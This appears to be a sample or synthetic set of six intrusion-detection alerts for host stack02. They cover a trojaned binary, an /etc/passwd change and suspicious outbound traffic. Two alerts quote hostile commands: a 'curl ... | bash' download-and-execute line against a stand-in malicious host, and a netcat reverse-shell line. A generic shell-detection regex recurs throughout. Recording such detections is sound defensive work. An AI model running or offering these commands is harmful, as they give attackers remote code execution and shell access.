Event #1:
Alert ID: 1720683874.36244
Alert Name: Rootcheck Anomaly Detection Event
Summary: Trojaned version of file '/usr/bin/diff' detected
Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
Affected User/Device: stack02
Criticality Level: MEDIUM

Event #2:
Alert ID: 1720683874.36245
Alert Name: Host-based Anomaly Detection Event (Rootcheck)
Summary: Suspicious modification of file '/etc/passwd' detected
Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
Affected User/Device: stack02
Criticality Level: HIGH

Event #3:
Alert ID: 1720683874.36246
Alert Name: Suspicious Execution of Binary File
Summary: Unauthorized execution of binary file detected (file: '/usr/bin/ls')
Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
Affected User/Device: stack02
Criticality Level: HIGH

Event #4:
Alert ID: 1720683874.36247
Alert Name: Potential Command Injection Vulnerability
Summary: Potentially malicious command injection detected (command: 'curl https://malicious-site.com | bash')
Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
Affected User/Device: stack02
Criticality Level: CRITICAL

Event #5:
Alert ID: 1720683874.36248
Alert Name: Unusual Network Traffic Patterns
Summary: Abnormal outbound network traffic detected from IP address '192.168.125.130'
Key Points: Destination IPs: ['103.22.217.245', '5.180.139.6']
Affected User/Device: stack02
Criticality Level: HIGH

Event #6:
Alert ID: 1720683874.36249
Alert Name: Suspicious Process Execution
Summary: Unauthorized execution of process detected (process: 'nc -e /bin/bash 10.0.0.1 5000')
Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
Affected User/Device: stack02
Criticality Level: CRITICAL